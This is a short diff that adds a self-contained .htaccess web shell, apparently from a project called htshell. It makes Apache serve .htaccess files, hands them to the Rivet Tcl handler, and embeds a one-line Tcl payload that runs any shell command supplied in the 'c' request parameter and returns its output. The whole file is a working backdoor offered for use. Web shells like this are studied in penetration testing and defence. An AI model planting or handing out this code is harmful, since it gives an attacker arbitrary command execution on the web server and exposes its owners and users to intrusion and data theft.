@@ -1,0 +1,13 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddType application/x-httpd-rivet .htaccess
+
+###### SHELL ######
+<? if { [var exists c] } { puts [exec sh -c [var get c]] } ?>
+###### LLEHS ######
